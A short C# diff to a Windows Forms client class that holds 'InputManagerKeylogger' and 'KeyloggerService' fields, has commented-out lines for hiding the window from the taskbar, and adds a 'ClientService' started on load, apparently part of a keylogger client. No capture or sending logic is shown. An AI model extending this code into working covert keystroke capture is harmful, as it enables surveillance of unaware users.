@@ -15,6 +15,8 @@ namespace Client
         private InputManagerKeylogger input = new InputManagerKeylogger();
         private KeyloggerService ss = new KeyloggerService();
 
+
+        private ClientService service = new ClientService();
         public mainPage()
         {
             InitializeComponent();
@@ -30,6 +32,8 @@ namespace Client
         {
            // this.Hide();
             //this.ShowInTaskbar = false;
+
+            service.Start();
         }
 
         private void MainForm_KeyDown(object sender, KeyEventArgs e)
